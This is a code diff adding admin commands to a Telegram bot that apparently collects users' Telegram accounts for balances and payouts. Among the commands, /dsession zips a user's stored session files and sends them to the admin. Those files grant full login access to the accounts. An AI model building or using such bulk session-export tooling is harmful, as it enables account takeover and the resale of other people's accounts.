@@ -766,3 +766,220 @@ async def bot_off_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if is_admin(update.effective_user.id):
         set_bot_status(False)
         await update.message.reply_text("🔴 Bot is now **OFF**", parse_mode="Markdown")
+# ====================== MORE ADMIN COMMANDS ======================
+async def delacc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: `/delacc +8801712345678`", parse_mode="Markdown")
+        return
+
+    phone = context.args[0]
+    if not phone.startswith("+"):
+        phone = "+" + phone
+
+    accounts = load_json(ACCOUNTS_FILE, {})
+    if phone not in accounts:
+        await update.message.reply_text(f"❌ Not found: `{phone}`", parse_mode="Markdown")
+        return
+
+    # Disconnect
+    if phone in clients:
+        try:
+            await clients[phone].disconnect()
+            del clients[phone]
+        except:
+            pass
+
+    # Delete session file
+    session_file = f"{SESSIONS_DIR}/{phone.replace('+','')}.session"
+    for f in [session_file, session_file + "-journal"]:
+        if os.path.exists(f):
+            try:
+                os.remove(f)
+            except:
+                pass
+
+    del accounts[phone]
+    save_json(ACCOUNTS_FILE, accounts)
+    remove_frozen(phone)
+
+    await update.message.reply_text(f"✅ Deleted `{phone}`", parse_mode="Markdown")
+
+
+async def freeze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: `/freeze +8801712345678`", parse_mode="Markdown")
+        return
+    phone = context.args[0] if context.args[0].startswith("+") else "+" + context.args[0]
+    add_frozen(phone)
+    await update.message.reply_text(f"❄️ Frozen: `{phone}`", parse_mode="Markdown")
+
+
+async def unfreeze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: `/unfreeze +8801712345678`", parse_mode="Markdown")
+        return
+    phone = context.args[0] if context.args[0].startswith("+") else "+" + context.args[0]
+    remove_frozen(phone)
+    await update.message.reply_text(f"✅ Unfrozen: `{phone}`", parse_mode="Markdown")
+
+
+async def userinfo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: `/userinfo 123456789`", parse_mode="Markdown")
+        return
+    try:
+        target = int(context.args[0])
+    except:
+        await update.message.reply_text("Invalid ID")
+        return
+
+    accounts = load_json(ACCOUNTS_FILE, {})
+    user_phones = [p for p, i in accounts.items() if i.get("uid") == target]
+    bal = load_json(BALANCES_FILE, {}).get(str(target), 0)
+
+    text = (
+        f"👤 User `{target}`\n"
+        f"Accounts: {len(user_phones)}\n"
+        f"Balance: ${bal:.2f}\n\n"
+    )
+    for p in user_phones[:15]:
+        text += f"{get_flag(p)} `{p}`\n"
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+
+async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        return
+    accounts = load_json(ACCOUNTS_FILE, {})
+    balances = load_json(BALANCES_FILE, {})
+    total_users = len(set(i.get("uid") for i in accounts.values()))
+    total_bal = sum(balances.values())
+
+    text = (
+        f"📈 **Statistics**\n\n"
+        f"Users: `{total_users}`\n"
+        f"Accounts: `{len(accounts)}`\n"
+        f"Total Balance: `${total_bal:.2f}`\n"
+        f"Online: `{len(clients)}`\n"
+        f"Frozen: `{len(get_frozen())}`"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown")
+    # ====================== USER SESSION DOWNLOAD + BROADCAST + BACKUP ======================
+
+async def dsession_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin: /dsession <user_id> → Download that user's all sessions"""
+    if not is_admin(update.effective_user.id):
+        return
+
+    if not context.args:
+        await update.message.reply_text("Usage:\n`/dsession 123456789`", parse_mode="Markdown")
+        return
+
+    try:
+        target_uid = int(context.args[0])
+    except:
+        await update.message.reply_text("Invalid User ID")
+        return
+
+    accounts = load_json(ACCOUNTS_FILE, {})
+    user_phones = [phone for phone, info in accounts.items() if info.get("uid") == target_uid]
+
+    if not user_phones:
+        await update.message.reply_text("This user has no accounts.")
+        return
+
+    zip_path = f"{DATA_DIR}/user_{target_uid}_sessions.zip"
+    with zipfile.ZipFile(zip_path, "w") as zf:
+        for phone in user_phones:
+            session_file = f"{SESSIONS_DIR}/{phone.replace('+','')}.session"
+            if os.path.exists(session_file):
+                zf.write(session_file, f"{phone.replace('+','')}.session")
+
+    await update.message.reply_document(
+        document=open(zip_path, "rb"),
+        filename=f"user_{target_uid}_sessions.zip",
+        caption=f"📁 Sessions of User: `{target_uid}`\nTotal Accounts: {len(user_phones)}"
+    )
+
+
+async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin: /broadcast message"""
+    if not is_admin(update.effective_user.id):
+        return
+
+    if not context.args:
+        await update.message.reply_text("Usage:\n`/broadcast Your message here`", parse_mode="Markdown")
+        return
+
+    message = " ".join(context.args)
+    accounts = load_json(ACCOUNTS_FILE, {})
+    user_ids = list(set(info.get("uid") for info in accounts.values() if info.get("uid")))
+
+    success = 0
+    failed = 0
+    status = await update.message.reply_text(f"📢 Sending to {len(user_ids)} users...")
+
+    for uid in user_ids:
+        try:
+            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
+            success += 1
+        except:
+            failed += 1
+
+    await status.edit_text(f"✅ Broadcast Done!\nSuccess: `{success}`\nFailed: `{failed}`", parse_mode="Markdown")
+
+
+async def backup_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin: /backup"""
+    if not is_admin(update.effective_user.id):
+        return
+
+    backup_path = f"{DATA_DIR}/backup_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
+    files_to_backup = [
+        ACCOUNTS_FILE, BALANCES_FILE, CLAIMS_FILE, REFS_FILE,
+        SETTINGS_FILE, ADMINS_FILE, CODES_FILE, FROZEN_FILE
+    ]
+
+    with zipfile.ZipFile(backup_path, "w") as zf:
+        for f in files_to_backup:
+            if os.path.exists(f):
+                zf.write(f, os.path.basename(f))
+
+    await update.message.reply_document(
+        document=open(backup_path, "rb"),
+        filename=os.path.basename(backup_path),
+        caption="📦 Full Bot Backup"
+    )
+
+
+async def cleanclaims_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin: /cleanclaims"""
+    if not is_admin(update.effective_user.id):
+        return
+
+    claims = load_json(CLAIMS_FILE, {})
+    now = datetime.now()
+    new_claims = {}
+    deleted = 0
+
+    for cid, data in claims.items():
+        if data.get("done"):
+            try:
+                claim_time = datetime.fromisoformat(data["time"])
+                if (now - claim_time).days > 7:
+                    deleted += 1
+                    continue
+            except:
+                pass
+        new_claims[cid] = data
+
+    save_json(CLAIMS_FILE, new_claims)
+    await update.message.reply_text(f"🧹 Cleaned `{deleted}` old claims.")
